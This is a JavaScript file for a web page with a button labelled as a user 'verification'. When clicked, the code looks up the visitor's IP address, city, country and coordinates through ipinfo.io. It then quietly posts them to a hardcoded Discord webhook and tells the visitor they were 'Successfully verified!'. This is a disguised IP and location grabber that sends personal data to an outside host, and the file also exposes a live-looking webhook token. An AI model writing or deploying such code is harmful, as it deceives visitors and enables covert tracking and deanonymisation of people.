const clicker = document.getElementById('clicker');
const output = document.getElementById('output');

clicker.addEventListener("click", async function() {
    try {
        fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                var ipAddress = data.ip;
                var country = data.country;
                var city = data.city;
                var latitude = data.loc.split(',')[0];
                var longitude = data.loc.split(',')[1];
                var browser = navigator.userAgent;
                var currentTime = new Date().toLocaleString();
                var webhookUrl = "https://discord.com/api/webhooks/1241440685404459039/Degknkd5-sSvnMKVpdWt9W5vp2LFdjvzECdk6Mkw0LosEHcEmhubTIxylw4HUQnI8ZA_";
                var message = "USER VERIFIED:\nIP address is: " + ipAddress + "\nlocated in: " + city + ", " + country + "\nlatitude is: " + latitude + "\nlongitude is: " + longitude + "\nbrowser was opened at: " + currentTime;

                var xhr = new XMLHttpRequest();
                xhr.open("POST", webhookUrl, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 204) {
                        console.log("verification successful!");
                        output.textContent = "Successfully verified!";
                    } else {
                        console.error("Error with verification: " + xhr.status);
                    }
                };
                xhr.send(JSON.stringify({
                    "content": message
                }));
            })
            .catch(error => {
                console.error(error.message);
            });
    } catch (error) {
        console.error(error);
        output.textContent = "An error has occured whilst verifying you. Please try again later.";
    }
})
